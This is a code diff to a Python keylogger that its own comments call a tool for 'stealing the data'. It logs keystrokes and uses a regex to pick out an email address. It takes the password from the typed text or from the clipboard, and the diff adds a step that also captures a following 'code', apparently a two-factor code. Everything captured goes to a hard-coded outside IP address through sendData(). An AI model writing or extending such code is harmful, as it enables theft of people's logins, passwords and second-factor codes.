@@ -28,9 +28,12 @@ bul = True
 #variable holding the global stream
 dataStream = ""
 mouseStream =""
+#global variable holding the email and password
 email =""
 password=""
+#variable holding the global bul for password, email and ctrl
 bul_email=False
+bul_password = False
 ctrl=False
 #api gateway for stealing the data
 apiUrl = 'http://3.17.7.99/api/sendData/'
@@ -120,26 +123,38 @@ def keyStrokes(event):
 #releases a key
 def on_release_keyboard(event):
     regex = re.compile(r'([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})+')
-    global email,password, bul_email, ctrl
+    global email,password, bul_email, ctrl, bul_password
     global key, dataStream
     global bul
+    #if enter or tab were pressed
     if event == keyboard.Key.enter or event == keyboard.Key.tab:
+        #if email was not entered
         if bul_email == False:
+            #searching the regex in the dataStream
             if re.search(regex,dataStream):
                 email = re.match(regex,dataStream).group(0)
                 dataStream=""
                 bul_email =True
-        else:
+        #if email was entered
+        elif bul_email == True:
+            #if ctrl was pressed
             if ctrl == True:
                 ctrl = False
+                #copy the text from clipboard
                 win32clipboard.OpenClipboard()
                 password = win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
+            #if ctrl was not pressed
             else: 
                 password = dataStream
-            dataStream = "email: {0} \n password: {1} \n".format(email,password)
-            sendData()
+            bul_password=True
+            dataStream = "email: {0} \n password: {1} \n code: ".format(email,password)
             bul_email = False
+        #if password was entered
+        elif bul_password == True:
+            #activates sendData
+            sendData()
+            bul_password = False
     if dataStream.find(key) != -1:
         os._exit
         bul = False
